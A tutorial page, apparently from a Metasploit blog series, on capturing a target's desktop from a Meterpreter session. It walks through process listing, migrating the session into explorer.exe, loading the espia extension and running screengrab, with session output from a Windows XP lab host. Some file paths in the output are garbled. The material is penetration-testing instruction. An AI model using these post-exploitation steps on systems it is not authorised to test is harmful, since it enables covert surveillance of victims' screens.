---
draft: false
title: MSF Screenshot
linkTitle: Screenshot
translationKey: msf-screenshot
date: 2017-06-05T13:38:00+03:00
weight: 250
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: Taking screenshots is one of the capabilities provided by the Meterpreter shell session. This method is generally used as evidence in pentest operations.
url: /msf-screenshot/
featured_image: /images/metasploit.jpg
categories:
  - Metasploit Framework
tags:
  - cybersecurity
  - metasploit
  - framework
---
## Screen Capture

One of the possibilities provided by the Meterpreter shell session is to be able to record the desktop image of the target computer. Taking a desktop image with this method is usually used as evidence in pentest operations.

When you log in to Meterpreter, you should move the session to the `explorer.exe` process. In the example below, the programs running on the system are first checked.

Let's assume that you have logged in to Meterpreter on the target computer. First, let's look at the running processes. You can use the `ps` command for this.

```bash
> Started bind handler
> Trying target Windows XP SP2 - English...
> Sending stage (719360 bytes)
> Meterpreter session 1 opened (192.168.1.101:34117 -> 192.168.1.104:4444)

meterpreter > ps

Process list
============

 PID Name Path
 --- ---- ----
 180 notepad.exe C:\WINDOWS\system32 otepad.exe
 248 snmp.exe C:\WINDOWS\System32\snmp.exe
 260 Explorer.EXE C:\WINDOWS\Explorer.EXE
 284 surgemail.exe c:\surgemail\surgemail.exe
 332 VMwareService.exe C:\Program Files\VMware\VMware Tools\VMwareService.exe
 612 VMwareTray.exe C:\Program Files\VMware\VMware Tools\VMwareTray.exe
 620 VMwareUser.exe C:\Program Files\VMware\VMware Tools\VMwareUser.exe
 648 ctfmon.exe C:\WINDOWS\system32\ctfmon.exe
 664 GrooveMonitor.exe C:\Program Files\Microsoft Office\Office12\GrooveMonitor.exe
 728 WZCSLDR2.exe C:\Program Files\ANI\ANIWZCS2 Service\WZCSLDR2.exe
 736 jusched.exe C:\Program Files\Java\jre6\b**in**\jusched.exe
 756 msmsgs.exe C:\Program Files\Messenger\msmsgs.exe
 816 smss.exe \SystemRoot\System32\smss.exe
 832 alg.exe C:\WINDOWS\System32\alg.exe
 904 csrss.exe \??\C:\WINDOWS\system32\csrss.exe
 928 winlogon.exe \??\C:\WINDOWS\system32\winlogon.exe
 972 services.exe C:\WINDOWS\system32\services.exe
 984 lsass.exe C:\WINDOWS\system32\lsass.exe
 1152 vmacthlp.exe C:\Program Files\VMware\VMware Tools\vmacthlp.exe
 1164 svchost.exe C:\WINDOWS\system32\svchost.exe
 1276 nwauth.exe c:\surgemail wauth.exe
 1296 svchost.exe C:\WINDOWS\system32\svchost.exe
 1404 svchost.exe C:\WINDOWS\System32\svchost.exe
 1500 svchost.exe C:\WINDOWS\system32\svchost.exe
 1652 svchost.exe C:\WINDOWS\system32\svchost.exe
 1796 spoolsv.exe C:\WINDOWS\system32\spoolsv.exe
 1912 3proxy.exe C:\3proxy\b**in**\3proxy.exe
 2024 jqs.exe C:\Program Files\Java\jre6\b**in**\jqs.exe
 2188 swatch.exe c:\surgemail\swatch.exe
 2444 iexplore.exe C:\Program Files\Internet Explorer\iexplore.exe
3004 cmd.exe C:\WINDOWS\system32\cmd.exe
```

As seen in the sample output, `explorer.exe` is running with PID number 260. Let's move the Meterpreter session to `explorer.exe` with the `migrate` command.

```bash
meterpreter > migrate 260
> Migrating to 260...
> Migration completed successfully.
```

Then let's activate the `espia` extension.

```bash
meterpreter > use espia
Loading extension espia...success.
```

Let's save the desktop image of the target computer with the `screengrab` command.

```bash
meterpreter > screengrab
Screenshot saved to: /root/nYdRUppb.jpeg
meterpreter >
```

As you can see, the Desktop image has been saved to our local computer. When doing this, it is important to switch to a program that can manipulate folders and files, such as `explorer.exe` or similar. Otherwise, the `screengrab` command may not work.
